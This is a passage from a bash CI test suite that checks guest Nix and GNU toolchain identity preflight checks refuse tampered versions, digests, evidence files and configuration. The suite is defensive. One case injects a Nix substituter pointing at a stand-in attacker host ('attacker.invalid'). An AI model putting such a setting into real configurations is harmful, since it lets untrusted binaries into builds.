  wrong-version) printf '%s\n' 'nix (Determinate Nix 3.21.9) 2.34.7' ;;
  empty) : ;;
  multiline) printf '%s\n%s\n' 'nix (Determinate Nix 3.21.9) 2.34.8' extra ;;
  *) printf '%s\n' 'nix (Determinate Nix 3.21.9) 2.34.8' ;;
esac
NIX
  chmod 0500 "$store_bin"
  ln -s "$store_bin" "$nix_bin"
  cp "$guest_nix_fixture_dir/guest-nix-bootstrap.sh" "$bootstrap"
  cp "$guest_nix_fixture_dir/guest-nix-installer" "$payload"
  cp "$payload" "$installed_copy"
  chmod 0600 "$bootstrap" "$payload" "$installed_copy"
  printf '%s\n' 'nix (Determinate Nix 3.21.9) 2.34.8' >"$evidence/version.txt"
  : >"$evidence/version.stderr"
  printf '%s\n' 'nix-installer 3.21.9' >"$evidence/installer-version.txt"
  : >"$evidence/installer-version.stderr"
  chmod 0600 "$evidence/version.txt" "$evidence/version.stderr" \
    "$evidence/installer-version.txt" "$evidence/installer-version.stderr"
  printf '%s\n' 'experimental-features = nix-command flakes' >"$root/etc/nix/nix.conf"
  chmod 0600 "$root/etc/nix/nix.conf"
  local nix_config_digest
  nix_config_digest=$(diene_file_digest "$root/etc/nix/nix.conf")
  printf '%s\n' 'inheritedNixFamily=none' 'profileNixVar=NIX_PROFILES' \
    'profileNixVar=NIX_SSL_CERT_FILE' 'home=/run/diene-ci/home' \
    'xdgConfigHome=/run/diene-ci/home/.config' \
    'userConfFiles=/run/diene-ci/nix-user.conf' \
    "etcNixConf=${nix_config_digest#sha256:}" >"$evidence/environment.txt"
  chmod 0600 "$evidence/environment.txt"
  local contract
  contract=$(diene_guest_nix_contract)
  jq -n --argjson guestNix "$contract" '{guestNix:$guestNix}' >"$input"
  case $mode in
    recorded-drift) printf '%s\n' wrong >"$evidence/version.txt" ;;
    non-store)
      install -d -m 0700 "$root/outside/bin"
      cp "$store_bin" "$root/outside/bin/nix"
      rm "$nix_bin"
      ln -s "$root/outside/bin/nix" "$nix_bin"
      ;;
    unresolvable)
      rm "$nix_bin"
      ln -s "$root/missing/bin/nix" "$nix_bin"
      ;;
    installed-copy-mismatch) printf X >>"$installed_copy" ;;
    upload-payload-mismatch) printf X >>"$payload" ;;
    upload-shell-mismatch) printf X >>"$bootstrap" ;;
    installer-version-mismatch) printf '%s\n' 'nix-installer 3.21.8' >"$evidence/installer-version.txt" ;;
    installer-stderr-mismatch) printf '%s\n' warning >"$evidence/installer-version.stderr" ;;
    environment-missing) rm "$evidence/environment.txt" ;;
    environment-fields)
      sed -i 's|^home=.*|home=/tmp/hostile|' "$evidence/environment.txt"
      ;;
    environment-order)
      sed -i \
        's/profileNixVar=NIX_PROFILES/profileNixVar=NIX_ZZZ/; s/profileNixVar=NIX_SSL_CERT_FILE/profileNixVar=NIX_AAA/' \
        "$evidence/environment.txt"
      ;;
    environment-mode) chmod 0644 "$evidence/environment.txt" ;;
    environment-config-drift) printf '%s\n' 'substituters = https://attacker.invalid' >>"$root/etc/nix/nix.conf" ;;
  esac
  export FAKE_IDENTITY_MODE=$mode
  local guest_nix
  guest_nix=$(diene_guest_nix_identity "$input" "$evidence" "$nix_bin" "$store_root" \
    "$installed_copy" "$bootstrap" "$payload" x86_64 "$root")
  jq -n --argjson guestNix "$guest_nix" '{guestNix:$guestNix}' >"$evidence/preflight.json"
  case $mode in
    receipt-mismatch)
      jq '.nixVersion = "tampered"' "$evidence/identity.json" >"$evidence/identity.json.tmp"
      mv "$evidence/identity.json.tmp" "$evidence/identity.json"
      ;;
    binding-digest-mismatch)
      jq '.guestNix.identityReceiptDigest = "sha256:0000000000000000000000000000000000000000000000000000000000000000"' \
        "$evidence/preflight.json" >"$evidence/preflight.json.tmp"
      mv "$evidence/preflight.json.tmp" "$evidence/preflight.json"
      ;;
    environment-post-identity-tamper)
      printf '%s\n' 'profileNixVar=NIX_CONFIG' >>"$evidence/environment.txt"
      ;;
  esac
  diene_require_guest_nix_preflight_agreement "$evidence/preflight.json" "$evidence/identity.json"
)

guest_nix_identity_refusal() {
  local label=${1:?identity case required} rc=0
  local root=$scratch/guest-nix-identity-$label
  if guest_nix_identity_probe "$label" "$root" >"$root.out" 2>"$root.err"; then
    fail "$label guest Nix identity unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label guest Nix identity did not exit 64 (got $rc)"
  assert_contains "$root.err" GuestNixIdentityUnexpected
  [[ ! -e $root/policy.json && ! -e $root/application-mutated ]] ||
    fail "$label guest Nix identity reached a protected mutation"
}

for identity_case in wrong-version empty multiline recorded-drift non-store unresolvable \
  installed-copy-mismatch upload-payload-mismatch upload-shell-mismatch installer-version-mismatch \
  installer-stderr-mismatch environment-missing environment-fields environment-order environment-mode \
  environment-config-drift environment-post-identity-tamper receipt-mismatch binding-digest-mismatch; do
  guest_nix_identity_refusal "$identity_case"
done
guest_nix_identity_probe happy "$scratch/guest-nix-identity-happy" \
  >"$scratch/guest-nix-identity-happy.out" 2>"$scratch/guest-nix-identity-happy.err" || {
  sed -n '1,160p' "$scratch/guest-nix-identity-happy.err" >&2
  fail 'the exact direct-path guest Nix identity did not pass'
}

preflight_profile_line=$(rg -n '^diene_source_guest_nix_profile ' \
  "$template_root/scripts/ci/environment-runner-preflight.sh" | cut -d: -f1)
preflight_identity_line=$(rg -n 'guest_nix=\$\(diene_guest_nix_identity' \
  "$template_root/scripts/ci/environment-runner-preflight.sh" | cut -d: -f1)
preflight_node_line=$(rg -n '^nodes=' "$template_root/scripts/ci/environment-runner-preflight.sh" | cut -d: -f1)
driver_preflight_line=$(rg -n 'diene_core_driver_preflight --output' \
  "$template_root/scripts/ci/environment-k3d-run.sh" | cut -d: -f1)
driver_policy_line=$(rg -n 'diene_apply_interim_policy "\$resolved"' \
  "$template_root/scripts/ci/environment-k3d-run.sh" | cut -d: -f1)
# The production application seam is source text, not a regular expression.
# shellcheck disable=SC2016
driver_application_seam='"${DIENE_PLS_BIN:-pls}" env up '
driver_application_line=$(rg -n -F "$driver_application_seam" \
  "$template_root/scripts/ci/environment-k3d-run.sh" | cut -d: -f1)
preflight_toolchain_line=$(rg -n 'guest_toolchain=\$\(diene_guest_toolchain_identity' \
  "$template_root/scripts/ci/environment-runner-preflight.sh" | cut -d: -f1)
preflight_toolchain_agreement_line=$(rg -n '^diene_require_guest_toolchain_preflight_agreement' \
  "$template_root/scripts/ci/environment-runner-preflight.sh" | cut -d: -f1)
preflight_output_line=$(rg -n '^  diene_write_json "\$output"$' \
  "$template_root/scripts/ci/environment-runner-preflight.sh" | cut -d: -f1)
for preflight_boundary in "$preflight_toolchain_line" "$preflight_toolchain_agreement_line" \
  "$preflight_output_line"; do
  [[ $preflight_boundary =~ ^[1-9][0-9]*$ ]] ||
    fail 'a runner preflight guest toolchain boundary is absent or ambiguous'
done
[[ $preflight_profile_line -lt $preflight_identity_line &&
  $preflight_identity_line -lt $preflight_toolchain_line &&
  $preflight_toolchain_line -lt $preflight_node_line &&
  $preflight_output_line -lt $preflight_toolchain_agreement_line &&
  $driver_preflight_line -lt $driver_policy_line &&
  $driver_preflight_line -lt $driver_application_line ]] ||
  fail 'guest Nix profile and identity are not ordered before posture, policy, and application mutation'
# The independent re-proof must read absolute guest paths, never the dev shell.
rg -q 'DIENE_GUEST_TOOLCHAIN_INPUT' "$template_root/scripts/ci/environment-runner-preflight.sh" ||
  fail 'the real runner preflight no longer binds the admitted guest toolchain input'
ok 'exact, empty, multiline, recorded, store-path, installed-copy, upload, receipt, and binding identity cases fail before mutation'
ok 'the runner independently re-proves the guest toolchain before posture and agrees after publication'

printf '== the pinned Wolfi GNU toolchain bootstrap fails closed ==\n'

guest_toolchain_good_packages=$(
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  printf '%s\n' "$DIENE_GUEST_TOOLCHAIN_PACKAGES"
)
guest_toolchain_sed_row='sed|4.10-r1|341772|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c'
grep -Fxq -- "$guest_toolchain_sed_row" <<<"$guest_toolchain_good_packages" ||
  fail 'the production Wolfi closure no longer carries the exact pinned sed row'

# Every refusal below mutates exactly one field of the otherwise admitted
# closure, so a pass proves the specific rule rather than a generic parse error.
guest_toolchain_mutated_packages() {
  local replacement=${1:?replacement row required}
  local mutated
  mutated=${guest_toolchain_good_packages/"$guest_toolchain_sed_row"/"$replacement"}
  [[ $mutated != "$guest_toolchain_good_packages" ]] ||
    fail 'a guest toolchain closure mutation did not change the admitted table'
  printf '%s\n' "$mutated"
}

guest_toolchain_contract_refusal() {
  local label=${1:?contract label required} rc=0
  if (
    # shellcheck source=/dev/null
    source "$guest_nix_work_lib_backup"
    case $label in
      malformed-row)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages "$guest_toolchain_sed_row|extra")
        ;;
      short-digest)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages 'sed|4.10-r1|341772|sha256:abcd')
        ;;
      unprefixed-digest)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'sed|4.10-r1|341772|64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      zero-bytes)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'sed|4.10-r1|0|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      negative-bytes)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'sed|4.10-r1|-341772|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      nonnumeric-bytes)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'sed|4.10-r1|not-a-number|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      unpinned-version)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'sed|4.10|341772|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      duplicate-package)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'grep|4.10-r1|341772|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      outside-closure)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(guest_toolchain_mutated_packages \
          'diffutils|4.10-r1|341772|sha256:64f97fb24d76be3d835114b93ef77385c82a8f3b432a775ed72394e86171f28c')
        ;;
      short-closure)
        DIENE_GUEST_TOOLCHAIN_PACKAGES=$(grep -Fxv -- "$guest_toolchain_sed_row" \
          <<<"$guest_toolchain_good_packages")
        ;;
      ruled-drift) DIENE_GUEST_TOOLCHAIN_RULED_SET='coreutils findutils sed grep gawk diffutils' ;;
      closure-drift) DIENE_GUEST_TOOLCHAIN_CLOSURE_SET='coreutils findutils sed grep gawk' ;;
      apk-bin-drift) DIENE_GUEST_TOOLCHAIN_APK_BIN=/sbin/apk ;;
      package-dir-drift) DIENE_GUEST_TOOLCHAIN_DIR=/tmp/gnu ;;
      repository-drift) DIENE_GUEST_TOOLCHAIN_REPO_BASE=https://packages.invalid/x86_64 ;;
      architecture-drift) DIENE_GUEST_TOOLCHAIN_ARCH=aarch64 ;;
      execution-mode-drift) DIENE_GUEST_TOOLCHAIN_EXECUTION_MODE=online-apk ;;
      *) exit 127 ;;
    esac
    export DIENE_GUEST_TOOLCHAIN_PACKAGES DIENE_GUEST_TOOLCHAIN_RULED_SET \
      DIENE_GUEST_TOOLCHAIN_CLOSURE_SET DIENE_GUEST_TOOLCHAIN_APK_BIN \
      DIENE_GUEST_TOOLCHAIN_DIR DIENE_GUEST_TOOLCHAIN_REPO_BASE \
      DIENE_GUEST_TOOLCHAIN_ARCH DIENE_GUEST_TOOLCHAIN_EXECUTION_MODE
    diene_guest_toolchain_contract
  ) >"$scratch/guest-toolchain-contract-$label.out" 2>"$scratch/guest-toolchain-contract-$label.err"; then
    fail "$label guest toolchain contract unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label guest toolchain contract did not exit 64 (got $rc)"
  assert_contains "$scratch/guest-toolchain-contract-$label.err" InputContractInvalid
  [[ ! -s $scratch/guest-toolchain-contract-$label.out ]] ||
    fail "$label guest toolchain contract emitted a partial contract before refusing"
}

for guest_toolchain_contract_case in malformed-row short-digest unprefixed-digest zero-bytes \
  negative-bytes nonnumeric-bytes unpinned-version duplicate-package outside-closure \
  short-closure ruled-drift closure-drift apk-bin-drift package-dir-drift repository-drift \
  architecture-drift execution-mode-drift; do
  guest_toolchain_contract_refusal "$guest_toolchain_contract_case"
done
ok 'malformed, unpinned, zero, negative, duplicate, outside-closure, and short-closure pins all refuse'

guest_toolchain_contract_one=$(
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  diene_guest_toolchain_contract
)
guest_toolchain_contract_two=$(
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  diene_guest_toolchain_contract
)
guest_toolchain_digest_one=$(
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  diene_guest_toolchain_contract_digest
)
guest_toolchain_digest_two=$(
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  diene_guest_toolchain_contract_digest
)
[[ $guest_toolchain_contract_one == "$guest_toolchain_contract_two" &&
  $guest_toolchain_digest_one == "$guest_toolchain_digest_two" ]] ||
  fail 'the guest toolchain contract or its digest is not byte-identical across two derivations'
[[ $guest_toolchain_digest_one =~ ^sha256:[0-9a-f]{64}$ ]] ||
  fail 'the guest toolchain contract digest is not a full sha256 receipt'
guest_toolchain_sorted_names='coreutils findutils gawk grep libacl1 libattr1 libpcre2-8-0 libselinux libsepol sed'
[[ $(jq -r '[.packages[].name] | join(" ")' <<<"$guest_toolchain_contract_one") == "$guest_toolchain_sorted_names" ]] ||
  fail 'the guest toolchain contract package array is not canonically name-sorted'
jq -e '
  .executionMode == "offline-pinned-apk" and .apkBinPath == "/usr/bin/apk" and
  .packageDir == "/run/diene-ci/gnu" and .architecture == "x86_64" and
  (.packages | length) == 10 and (.argv | length) == 14 and
  (.argv | .[0:4]) == ["add","--no-progress","--no-network","--allow-untrusted"] and
  (.argv | .[4:] | map(startswith("/run/diene-ci/gnu/")) | all) and
  (.argv | .[4:]) == [
    "/run/diene-ci/gnu/libacl1-2.4.0-r1.apk","/run/diene-ci/gnu/libattr1-2.6.0-r1.apk",
    "/run/diene-ci/gnu/libpcre2-8-0-10.47-r0.apk","/run/diene-ci/gnu/libsepol-3.11-r0.apk",
    "/run/diene-ci/gnu/libselinux-3.11-r0.apk","/run/diene-ci/gnu/coreutils-9.11-r3.apk",
    "/run/diene-ci/gnu/findutils-4.11.0-r1.apk","/run/diene-ci/gnu/gawk-5.4.1-r0.apk",
    "/run/diene-ci/gnu/grep-3.12-r6.apk","/run/diene-ci/gnu/sed-4.10-r1.apk"]
' <<<"$guest_toolchain_contract_one" >/dev/null ||
  fail 'the guest toolchain contract lost its fixed offline argv or dependency-first install order'
ok 'the guest toolchain contract digest is deterministic, name-sorted, and fixed-argv bound'

guest_toolchain_identity_rows=(
  'sed|/usr/bin/sed|/usr/bin/sed|(GNU sed)'
  'grep|/usr/bin/grep|/usr/bin/grep|(GNU grep)'
  'awk|/usr/bin/awk|/usr/bin/gawk|GNU Awk'
  'find|/usr/bin/find|/usr/bin/find|(GNU findutils)'
  'xargs|/usr/bin/xargs|/usr/bin/xargs|(GNU findutils)'
  'sha256sum|/usr/bin/sha256sum|/usr/bin/coreutils|(GNU coreutils)'
  'stat|/usr/bin/stat|/usr/bin/coreutils|(GNU coreutils)'
  'cut|/usr/bin/cut|/usr/bin/coreutils|(GNU coreutils)'
  'sort|/usr/bin/sort|/usr/bin/coreutils|(GNU coreutils)'
  'head|/usr/bin/head|/usr/bin/coreutils|(GNU coreutils)'
  'wc|/usr/bin/wc|/usr/bin/coreutils|(GNU coreutils)'
  'date|/usr/bin/date|/usr/bin/coreutils|(GNU coreutils)'
  'tr|/usr/bin/tr|/usr/bin/coreutils|(GNU coreutils)'
  'cat|/usr/bin/cat|/usr/bin/coreutils|(GNU coreutils)'
  'install|/usr/bin/install|/usr/bin/coreutils|(GNU coreutils)'
  'readlink|/usr/bin/readlink|/usr/bin/coreutils|(GNU coreutils)'
  'id|/usr/bin/id|/usr/bin/coreutils|(GNU coreutils)'
  'mktemp|/usr/bin/mktemp|/usr/bin/coreutils|(GNU coreutils)'
  'chmod|/usr/bin/chmod|/usr/bin/coreutils|(GNU coreutils)'
  'rm|/usr/bin/rm|/usr/bin/coreutils|(GNU coreutils)'
  'uname|/usr/bin/uname|/usr/bin/coreutils|(GNU coreutils)'
)
# The independent expectation of the twenty-one proven utilities plus the two
# behaviour proofs and the three BusyBox tar facts, written here rather than
# read back from the production text so a silent narrowing cannot pass.
guest_toolchain_write_expected_identity() {
  local row name binary logical token
  for row in "${guest_toolchain_identity_rows[@]}"; do
    IFS='|' read -r name binary logical token <<<"$row"
    printf '%s|%s|%s|%s \n' "$name" "$binary" "$logical" "$token"
  done
  printf '%s\n' behaviorSha256sumCheck=pass behaviorSedInPlace=pass \
    tarImplementation=busybox tarResolvedPath=/usr/bin/busybox \
    tarPortableFlags=-cf,-tf,-tvf,-xf,-C,-f tarTypeCharacter=-
}
guest_toolchain_write_expected_pins() {
  printf '%s\n' executionMode=offline-pinned-apk
  tr '|' ' ' <<<"$guest_toolchain_good_packages"
}

guest_toolchain_identity_probe() (
  local mode=${1:?toolchain identity mode required} root=${2:?toolchain identity root required}
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  local bin=$root/usr/bin evidence=$root/evidence/gnu-toolchain input=$root/inputs.json
  local coreutils_tool row name binary logical token
  install -d -m 0700 "$root" "$bin" "$evidence"
  cat >"$bin/sed" <<'FAKE_SED'
#!/bin/sh
if [ "$1" = --version ]; then
  case ${FAKE_TOOLCHAIN_MODE:-happy} in
    missing-token) printf '%s\n' 'sed (BusyBox) 1.37.0' ;;
    probe-stderr) printf '%s\n' '/usr/bin/sed (GNU sed) 4.10'; printf '%s\n' warning >&2 ;;
    probe-failure) exit 3 ;;
    *) printf '%s\n' '/usr/bin/sed (GNU sed) 4.10' ;;
  esac
  exit 0
fi
[ "$1" != -i ] || [ "${FAKE_TOOLCHAIN_MODE:-happy}" != sed-in-place ] || exit 0
exec sed "$@"
FAKE_SED
  cat >"$bin/grep" <<'FAKE_GREP'
#!/bin/sh
if [ "$1" = --version ]; then printf '%s\n' 'grep (GNU grep) 3.12'; exit 0; fi
exec grep "$@"
FAKE_GREP
  cat >"$bin/gawk" <<'FAKE_GAWK'
#!/bin/sh
if [ "$1" = --version ]; then printf '%s\n' 'GNU Awk 5.4.1, API 4.1, PMA Avon 8-g1'; exit 0; fi
exec awk "$@"
FAKE_GAWK
  cat >"$bin/find" <<'FAKE_FIND'
#!/bin/sh
if [ "$1" = --version ]; then printf '%s\n' 'find (GNU findutils) 4.11.0'; exit 0; fi
exec find "$@"
FAKE_FIND
  cat >"$bin/xargs" <<'FAKE_XARGS'
#!/bin/sh
if [ "$1" = --version ]; then printf '%s\n' 'xargs (GNU findutils) 4.11.0'; exit 0; fi
exec xargs "$@"
FAKE_XARGS
  cat >"$bin/coreutils" <<'FAKE_COREUTILS'
#!/bin/sh
tool=${0##*/}
[ "$tool" != coreutils ] || exit 127
if [ "$1" = --version ]; then printf '%s (GNU coreutils) 9.11\n' "$tool"; exit 0; fi
if [ "$tool" = sha256sum ] && [ "$1" = --check ] &&
  [ "${FAKE_TOOLCHAIN_MODE:-happy}" = sha256-check ]; then
  printf '%s\n' 'known.txt: FAILED' >&2
  exit 1
fi
exec "$tool" "$@"
FAKE_COREUTILS
  cat >"$bin/busybox" <<'FAKE_BUSYBOX'
#!/bin/sh
tool=${0##*/}
[ "$tool" != busybox ] || exit 127
if [ "$tool" = tar ] && [ "$1" = -tvf ] &&
  [ "${FAKE_TOOLCHAIN_MODE:-happy}" = tar-type ]; then
  printf '%s\n' 'lrwxrwxrwx 0/0 0 2026-08-02 00:00 member'
  exit 0
fi
exec "$tool" "$@"
FAKE_BUSYBOX
  chmod 0755 "$bin/sed" "$bin/grep" "$bin/gawk" "$bin/find" "$bin/xargs" \
    "$bin/coreutils" "$bin/busybox"
  ln -s gawk "$bin/awk"
  ln -s busybox "$bin/tar"
  for coreutils_tool in sha256sum stat cut sort head wc date tr cat install readlink id \
    mktemp chmod rm uname; do
    ln -s coreutils "$bin/$coreutils_tool"
  done
  guest_toolchain_write_expected_pins >"$evidence/pins.txt"
  printf '%s\n' 'OK: 26 MiB in 25 packages' >"$evidence/install.log"
  guest_toolchain_write_expected_identity >"$evidence/identity.txt"
  chmod 0600 "$evidence/pins.txt" "$evidence/install.log" "$evidence/identity.txt"
  jq -n --argjson guestToolchain "$(diene_guest_toolchain_contract)" \
    '{guestToolchain:$guestToolchain}' >"$input"
  case $mode in
    busybox-resolution)
      rm "$bin/sed"
      ln -s busybox "$bin/sed"
      ;;
    tar-not-busybox)
      rm "$bin/tar"
      printf '%s\n' '#!/bin/sh' 'exec tar "$@"' >"$bin/tar"
      chmod 0755 "$bin/tar"
      ;;
    absent-binary) rm "$bin/xargs" ;;
    pins-drift) printf '%s\n' 'sed 4.10-r1 1 sha256:00' >"$evidence/pins.txt" ;;
    pins-mode) chmod 0644 "$evidence/pins.txt" ;;
    install-log-absent) rm "$evidence/install.log" ;;
    stage-identity-drift) printf '%s\n' 'tarImplementation=gnu' >>"$evidence/identity.txt" ;;
    stage-identity-mode) chmod 0644 "$evidence/identity.txt" ;;
    contract-drift)
      jq '.guestToolchain.apkBinPath = "/sbin/apk"' "$input" >"$input.tmp"
      mv "$input.tmp" "$input"
      ;;
  esac
  export FAKE_TOOLCHAIN_MODE=$mode
  # Stop at the first refusal so every case proves exactly one stable class:
  # `set -e` is suspended inside the `if` that calls this probe, so a failed
  # command substitution would otherwise fall through into a second refusal.
  local guest_toolchain
  guest_toolchain=$(diene_guest_toolchain_identity "$input" "$evidence" "$root") || exit $?
  jq -n --argjson guestToolchain "$guest_toolchain" '{guestToolchain:$guestToolchain}' \
    >"$evidence/preflight.json" || exit $?
  case $mode in
    receipt-mismatch)
      jq '.tarTypeCharacter = "l"' "$evidence/identity.json" >"$evidence/identity.json.tmp"
      mv "$evidence/identity.json.tmp" "$evidence/identity.json"
      ;;
    binding-digest-mismatch)
      jq '.guestToolchain.identityReceiptDigest = "sha256:0000000000000000000000000000000000000000000000000000000000000000"' \
        "$evidence/preflight.json" >"$evidence/preflight.json.tmp"
      mv "$evidence/preflight.json.tmp" "$evidence/preflight.json"
      ;;
    pins-post-identity-tamper) printf '%s\n' 'sed 4.10-r1 1 sha256:00' >>"$evidence/pins.txt" ;;
    install-log-post-identity-tamper) printf '%s\n' tampered >>"$evidence/install.log" ;;
  esac
  diene_require_guest_toolchain_preflight_agreement "$evidence/preflight.json" \
    "$evidence/identity.json"
)

guest_toolchain_identity_refusal() {
  local label=${1:?toolchain identity case required} reason=${2:?refusal class required} rc=0
  local root=$scratch/guest-toolchain-identity-$label
  if guest_toolchain_identity_probe "$label" "$root" >"$root.out" 2>"$root.err"; then
    fail "$label guest toolchain identity unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label guest toolchain identity did not exit 64 (got $rc)"
  assert_contains "$root.err" "$reason"
  [[ $(grep -Ec '^Guest(Nix|Toolchain)[A-Za-z]+:' "$root.err") == 1 ]] ||
    fail "$label guest toolchain identity did not emit exactly one stable refusal class"
}

guest_toolchain_identity_refusal busybox-resolution GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal missing-token GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal probe-stderr GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal probe-failure GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal absent-binary GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal sha256-check GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal sed-in-place GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal tar-not-busybox GuestToolchainTarUnexpected
guest_toolchain_identity_refusal tar-type GuestToolchainTarUnexpected
guest_toolchain_identity_refusal pins-drift GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal pins-mode GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal install-log-absent GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal stage-identity-drift GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal stage-identity-mode GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal contract-drift GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal receipt-mismatch GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal binding-digest-mismatch GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal pins-post-identity-tamper GuestToolchainIdentityUnexpected
guest_toolchain_identity_refusal install-log-post-identity-tamper GuestToolchainIdentityUnexpected
ok 'busybox, token, stderr, behaviour, tar, evidence, contract, and binding drift all refuse independently'

guest_toolchain_identity_happy_root=$scratch/guest-toolchain-identity-happy
guest_toolchain_identity_probe happy "$guest_toolchain_identity_happy_root" \
  >"$guest_toolchain_identity_happy_root.out" 2>"$guest_toolchain_identity_happy_root.err" || {
  sed -n '1,160p' "$guest_toolchain_identity_happy_root.err" >&2
  fail 'the exact absolute-path guest toolchain identity did not pass'
}
guest_toolchain_happy_evidence=$guest_toolchain_identity_happy_root/evidence/gnu-toolchain
jq -e '
  .absolutePathIdentity == true and .sha256sumCheckBehavior == true and
  .sedInPlaceBehavior == true and .tarImplementation == "busybox" and
  .tarResolvedPath == "/usr/bin/busybox" and .tarTypeCharacter == "-" and
  .tarPortableFlags == ["-cf","-tf","-tvf","-xf","-C","-f"] and
  (.contractDigest | test("^sha256:[0-9a-f]{64}$"))
' "$guest_toolchain_happy_evidence/identity.json" >/dev/null ||
  fail 'the passing guest toolchain identity receipt lost a proven fact'
[[ -z $(find "$guest_toolchain_happy_evidence" -maxdepth 1 -name '.identity-proof.*' -print -quit) ]] ||
  fail 'the passing guest toolchain identity left its behaviour scratch directory behind'
[[ $(find "$guest_toolchain_happy_evidence" -maxdepth 1 -name '*-version.txt' | wc -l) == 21 ]] ||
  fail 'the guest toolchain identity did not independently probe all twenty-one utilities'
ok 'the independent absolute-path proof records twenty-one utilities, both behaviours, and BusyBox tar'

guest_toolchain_evidence_dir_refusal() {
  local label=${1:?evidence label required} staging=${2-} rc=0
  if (
    # shellcheck source=/dev/null
    source "$guest_nix_work_lib_backup"
    if [[ -n $staging ]]; then export DIENE_EVIDENCE_STAGING=$staging; else unset DIENE_EVIDENCE_STAGING; fi
    diene_guest_toolchain_evidence_dir
  ) >"$scratch/guest-toolchain-evidence-$label.out" 2>"$scratch/guest-toolchain-evidence-$label.err"; then
    fail "$label guest toolchain evidence directory unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label guest toolchain evidence directory did not exit 64"
  assert_contains "$scratch/guest-toolchain-evidence-$label.err" GuestToolchainIdentityUnexpected
}
guest_toolchain_evidence_root=$scratch/guest-toolchain-evidence-root
install -d -m 0700 "$guest_toolchain_evidence_root/staging" "$guest_toolchain_evidence_root/other"
guest_toolchain_evidence_dir_refusal unset ''
guest_toolchain_evidence_dir_refusal relative staging
guest_toolchain_evidence_dir_refusal absent "$guest_toolchain_evidence_root/missing/staging"
guest_toolchain_evidence_dir_refusal misnamed "$guest_toolchain_evidence_root/other"
guest_toolchain_evidence_created=$(
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  export DIENE_EVIDENCE_STAGING=$guest_toolchain_evidence_root/staging
  diene_guest_toolchain_evidence_dir
)
[[ $guest_toolchain_evidence_created == "$guest_toolchain_evidence_root/gnu-toolchain" &&
  -d $guest_toolchain_evidence_created &&
  $(stat -c %a -- "$guest_toolchain_evidence_created") == 700 ]] ||
  fail 'the driver-owned guest toolchain evidence directory is not the private sibling of staging'
ok 'guest toolchain evidence requires an absolute driver-owned staging sibling at mode 0700'

printf '== resolver, hostile probe, and vendor broker fail closed ==\n'

prepare_run 7110
if (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_inputs
  diene_prepare_egress_contract "$scratch/resolver-contract.json"
  export DIENE_EGRESS_RESOLVER_BIN="$policy_tools/resolver" FAKE_RESOLVER_IPV4=not-an-ip
  diene_resolve_egress_contract "$scratch/resolver-contract.json" "$scratch/resolver-invalid.json"
) >"$scratch/resolver-invalid.out" 2>"$scratch/resolver-invalid.err"; then
  fail 'an invalid resolver result was accepted'
fi
assert_contains "$scratch/resolver-invalid.err" ConnectedEgressInterfaceUnavailable
ok 'invalid resolved addresses refuse before policy activation'

probe_adapter_case() (
  local label=${1:?label required}
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_inputs
  export DIENE_NSC_CLUSTER_ID="cluster-probe-$label"
  export DIENE_EVIDENCE_STAGING="$scratch/probe-$label-staging"
  install -d -m 0700 "$DIENE_EVIDENCE_STAGING"
  export FAKE_PROBE_LOG="$scratch/probe-$label.log"
  : >"$FAKE_PROBE_LOG"
  diene_preflow_start
  diene_verify_hostile_egress "$scratch/probe-$label.json"
)

expect_probe_refusal() {
  local label=${1:?label required}
  expect_refusal InterimPolicyUnavailable probe_adapter_case "$label"
  [[ ! -e $scratch/probe-$label.json ]] ||
